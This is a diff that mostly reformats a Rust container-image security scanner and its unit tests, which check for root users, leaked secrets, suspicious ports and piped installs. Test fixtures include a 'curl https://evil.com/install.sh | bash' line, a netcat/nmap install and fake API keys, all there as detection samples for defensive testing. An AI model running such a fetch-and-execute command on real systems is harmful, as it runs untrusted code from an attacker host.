@@ -164,15 +164,19 @@ impl ContainerScanner {
             return None;
         }
 
-        let json: serde_json::Value =
-            serde_json::from_slice(&output.stdout).ok()?;
+        let json: serde_json::Value = serde_json::from_slice(&output.stdout).ok()?;
         json.as_array()?.first().cloned()
     }
 
     /// Get image history from Docker.
     pub fn image_history(image: &str) -> Vec<HistoryEntry> {
         let output = match Command::new("docker")
-            .args(["history", "--no-trunc", "--format", "{{.CreatedBy}}\t{{.Size}}"])
+            .args([
+                "history",
+                "--no-trunc",
+                "--format",
+                "{{.CreatedBy}}\t{{.Size}}",
+            ])
             .arg(image)
             .output()
         {
@@ -200,38 +204,74 @@ impl ContainerScanner {
         let repo_tags: Vec<String> = inspect
             .get("RepoTags")
             .and_then(|v| v.as_array())
-            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .map(|a| {
+                a.iter()
+                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
+                    .collect()
+            })
             .unwrap_or_default();
 
         let size = inspect.get("Size").and_then(|v| v.as_u64()).unwrap_or(0);
-        let created = inspect.get("Created").and_then(|v| v.as_str()).unwrap_or("").to_string();
-        let os = inspect.get("Os").and_then(|v| v.as_str()).unwrap_or("linux").to_string();
-        let arch = inspect.get("Architecture").and_then(|v| v.as_str()).unwrap_or("").to_string();
-        let author = inspect.get("Author").and_then(|v| v.as_str()).unwrap_or("").to_string();
+        let created = inspect
+            .get("Created")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let os = inspect
+            .get("Os")
+            .and_then(|v| v.as_str())
+            .unwrap_or("linux")
+            .to_string();
+        let arch = inspect
+            .get("Architecture")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let author = inspect
+            .get("Author")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
 
         let layers: Vec<String> = inspect
             .get("RootFS")
             .and_then(|v| v.get("Layers"))
             .and_then(|v| v.as_array())
-            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .map(|a| {
+                a.iter()
+                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
+                    .collect()
+            })
             .unwrap_or_default();
 
         let env_vars: Vec<String> = config
             .get("Env")
             .and_then(|v| v.as_array())
-            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .map(|a| {
+                a.iter()
+                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
+                    .collect()
+            })
             .unwrap_or_default();
 
         let cmd: Vec<String> = config
             .get("Cmd")
             .and_then(|v| v.as_array())
-            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .map(|a| {
+                a.iter()
+                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
+                    .collect()
+            })
             .unwrap_or_default();
 
         let entrypoint: Vec<String> = config
             .get("Entrypoint")
             .and_then(|v| v.as_array())
-            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .map(|a| {
+                a.iter()
+                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
+                    .collect()
+            })
             .unwrap_or_default();
 
         let exposed_ports: Vec<String> = config
@@ -240,7 +280,11 @@ impl ContainerScanner {
             .map(|m| m.keys().cloned().collect())
             .unwrap_or_default();
 
-        let user = config.get("User").and_then(|v| v.as_str()).unwrap_or("").to_string();
+        let user = config
+            .get("User")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
 
         Some(ImageInfo {
             id,
@@ -275,7 +319,10 @@ impl ContainerScanner {
                     DetectionCategory::HeuristicAnomaly {
                         rule: "container_inspect_failed".to_string(),
                     },
-                    format!("Failed to inspect Docker image: {} — image may not exist locally", image),
+                    format!(
+                        "Failed to inspect Docker image: {} — image may not exist locally",
+                        image
+                    ),
                     0.3,
                     RecommendedAction::Alert,
                 ));
@@ -424,8 +471,10 @@ impl ContainerScanner {
 
             // Check for curl|bash or wget|sh patterns (supply chain risk)
             if (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
-                && (cmd_lower.contains("| sh") || cmd_lower.contains("| bash")
-                    || cmd_lower.contains("|sh") || cmd_lower.contains("|bash"))
+                && (cmd_lower.contains("| sh")
+                    || cmd_lower.contains("| bash")
+                    || cmd_lower.contains("|sh")
+                    || cmd_lower.contains("|bash"))
             {
                 results.push(ScanResult::new(
                     "container_scanner",
@@ -560,7 +609,8 @@ impl ContainerScanner {
         }
 
         // Create a temporary container and export filesystem
-        let tmp_dir = std::env::temp_dir().join(format!("nexus-container-scan-{}", uuid::Uuid::new_v4()));
+        let tmp_dir =
+            std::env::temp_dir().join(format!("nexus-container-scan-{}", uuid::Uuid::new_v4()));
         let _ = std::fs::create_dir_all(&tmp_dir);
 
         // docker create (don't run), then docker export
@@ -594,9 +644,7 @@ impl ContainerScanner {
                             .output();
 
                         // Scan extracted files with all engines
-                        results.extend(
-                            self.scan_extracted_dir(&extract_dir, scanners).await,
-                        );
+                        results.extend(self.scan_extracted_dir(&extract_dir, scanners).await);
                     }
                 }
             } else {
@@ -647,7 +695,11 @@ impl ContainerScanner {
                             let mut scan_results = scanner.scan_file(&path).await;
                             // Rewrite target to show container context
                             for r in &mut scan_results {
-                                r.target = format!("[container] {}/{}", subdir, entry.file_name().to_string_lossy());
+                                r.target = format!(
+                                    "[container] {}/{}",
+                                    subdir,
+                                    entry.file_name().to_string_lossy()
+                                );
                                 r.scanner = format!("container_scanner+{}", r.scanner);
                             }
                             results.extend(scan_results);
@@ -729,11 +781,18 @@ mod tests {
     fn detect_root_user_empty() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec!["test:latest".into()],
-            size: 0, created: "".into(), os: "linux".into(),
-            architecture: "amd64".into(), author: "".into(),
-            layers: vec![], env_vars: vec![], cmd: vec![],
-            entrypoint: vec![], exposed_ports: vec![],
+            id: "test".into(),
+            repo_tags: vec!["test:latest".into()],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "amd64".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
             user: "".into(), // empty = root
             history: vec![],
         };
@@ -746,11 +805,20 @@ mod tests {
     fn detect_root_user_explicit() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![], env_vars: vec![],
-            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
-            user: "root".into(), history: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
+            user: "root".into(),
+            history: vec![],
         };
         let results = scanner.check_running_as_root(&info, "test");
         assert!(!results.is_empty());
@@ -760,11 +828,20 @@ mod tests {
     fn no_alert_nonroot_user() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![], env_vars: vec![],
-            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
-            user: "appuser".into(), history: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
+            user: "appuser".into(),
+            history: vec![],
         };
         let results = scanner.check_running_as_root(&info, "test");
         assert!(results.is_empty());
@@ -774,16 +851,24 @@ mod tests {
     fn detect_env_secrets() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
             env_vars: vec![
                 "PATH=/usr/bin".to_string(),
                 "DATABASE_URL=postgres://user:pass@host/db".to_string(),
                 "API_KEY=sk-12345".to_string(),
             ],
-            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
-            user: "app".into(), history: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
+            user: "app".into(),
+            history: vec![],
         };
         let results = scanner.check_env_secrets(&info, "test");
         assert_eq!(results.len(), 2); // DATABASE_URL and API_KEY
@@ -794,12 +879,20 @@ mod tests {
     fn no_secret_in_path() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
             env_vars: vec!["PATH=/usr/bin".to_string(), "HOME=/root".to_string()],
-            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
-            user: "app".into(), history: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
+            user: "app".into(),
+            history: vec![],
         };
         let results = scanner.check_env_secrets(&info, "test");
         assert!(results.is_empty());
@@ -811,10 +904,18 @@ mod tests {
         let info = ImageInfo {
             id: "test".into(),
             repo_tags: vec!["kalilinux/kali-rolling:latest".to_string()],
-            size: 0, created: "".into(), os: "linux".into(),
-            architecture: "".into(), author: "".into(), layers: vec![],
-            env_vars: vec![], cmd: vec![], entrypoint: vec![],
-            exposed_ports: vec![], user: "".into(), history: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
+            user: "".into(),
+            history: vec![],
         };
         let results = scanner.check_dangerous_base(&info, "test");
         assert!(!results.is_empty());
@@ -824,12 +925,20 @@ mod tests {
     fn detect_suspicious_port() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![], env_vars: vec![],
-            cmd: vec![], entrypoint: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
             exposed_ports: vec!["4444/tcp".to_string(), "8080/tcp".to_string()],
-            user: "app".into(), history: vec![],
+            user: "app".into(),
+            history: vec![],
         };
         let results = scanner.check_exposed_ports(&info, "test");
         assert_eq!(results.len(), 1); // Only 4444, not 8080
@@ -840,20 +949,27 @@ mod tests {
     fn detect_pipe_to_shell() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![], env_vars: vec![],
-            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
             user: "app".into(),
-            history: vec![
-                HistoryEntry {
-                    created_by: "RUN curl https://evil.com/install.sh | bash".to_string(),
-                    empty_layer: false,
-                },
-            ],
+            history: vec![HistoryEntry {
+                created_by: "RUN curl https://evil.com/install.sh | bash".to_string(),
+                empty_layer: false,
+            }],
         };
         let results = scanner.check_suspicious_packages(&info, "test");
-        let pipe_results: Vec<_> = results.iter()
+        let pipe_results: Vec<_> = results
+            .iter()
             .filter(|r| r.description.contains("Pipe-to-shell"))
             .collect();
         assert!(!pipe_results.is_empty());
@@ -863,17 +979,23 @@ mod tests {
     fn detect_nmap_install() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![], env_vars: vec![],
-            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
             user: "app".into(),
-            history: vec![
-                HistoryEntry {
-                    created_by: "RUN apt-get install -y nmap netcat".to_string(),
-                    empty_layer: false,
-                },
-            ],
+            history: vec![HistoryEntry {
+                created_by: "RUN apt-get install -y nmap netcat".to_string(),
+                empty_layer: false,
+            }],
         };
         let results = scanner.check_suspicious_packages(&info, "test");
         assert!(results.len() >= 2); // nmap + netcat
@@ -883,17 +1005,23 @@ mod tests {
     fn detect_chmod_777() {
         let scanner = test_scanner();
         let info = ImageInfo {
-            id: "test".into(), repo_tags: vec![], size: 0,
-            created: "".into(), os: "linux".into(), architecture: "".into(),
-            author: "".into(), layers: vec![], env_vars: vec![],
-            cmd: vec![], entrypoint: vec![], exposed_ports: vec![],
+            id: "test".into(),
+            repo_tags: vec![],
+            size: 0,
+            created: "".into(),
+            os: "linux".into(),
+            architecture: "".into(),
+            author: "".into(),
+            layers: vec![],
+            env_vars: vec![],
+            cmd: vec![],
+            entrypoint: vec![],
+            exposed_ports: vec![],
             user: "app".into(),
-            history: vec![
-                HistoryEntry {
-                    created_by: "RUN chmod 777 /app".to_string(),
-                    empty_layer: false,
-                },
-            ],
+            history: vec![HistoryEntry {
+                created_by: "RUN chmod 777 /app".to_string(),
+                empty_layer: false,
+            }],
         };
         let results = scanner.check_history_commands(&info, "test");
         assert!(!results.is_empty());
@@ -912,19 +1040,21 @@ mod tests {
         let info = ImageInfo {
             id: "test".into(),
             repo_tags: vec!["myapp:1.0".to_string()],
-            size: 50_000_000, created: "2026-03-25".into(),
-            os: "linux".into(), architecture: "amd64".into(),
-            author: "dev".into(), layers: vec![],
+            size: 50_000_000,
+            created: "2026-03-25".into(),
+            os: "linux".into(),
+            architecture: "amd64".into(),
+            author: "dev".into(),
+            layers: vec![],
             env_vars: vec!["PATH=/usr/bin".to_string()],
             cmd: vec!["/app/server".to_string()],
-            entrypoint: vec![], exposed_ports: vec!["8080/tcp".to_string()],
+            entrypoint: vec![],
+            exposed_ports: vec!["8080/tcp".to_string()],
             user: "appuser".into(),
-            history: vec![
-                HistoryEntry {
-                    created_by: "RUN apt-get install -y ca-certificates".to_string(),
-                    empty_layer: false,
-                },
-            ],
+            history: vec![HistoryEntry {
+                created_by: "RUN apt-get install -y ca-certificates".to_string(),
+                empty_layer: false,
+            }],
         };
         let mut results = Vec::new();
         results.extend(scanner.check_running_as_root(&info, "test"));
